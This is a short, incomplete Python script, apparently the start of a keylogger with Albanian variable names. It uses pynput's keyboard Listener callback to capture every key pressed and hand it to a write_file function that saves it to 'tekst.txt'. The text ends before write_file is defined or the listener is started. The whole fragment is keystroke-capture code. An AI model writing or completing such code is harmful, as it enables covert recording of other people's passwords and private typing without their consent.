import os
from pynput.keyboard import Listener


qelesat = []
numerimi = 0

path = 'tekst.txt'


def on_press(qeles) :
	global qelesat, numerimi


	qelesat.append(qeles)
	numerimi +=1

	if numerimi >= 1:
		numerimi = 0
		write_file(qelesat)
		qelesat = []
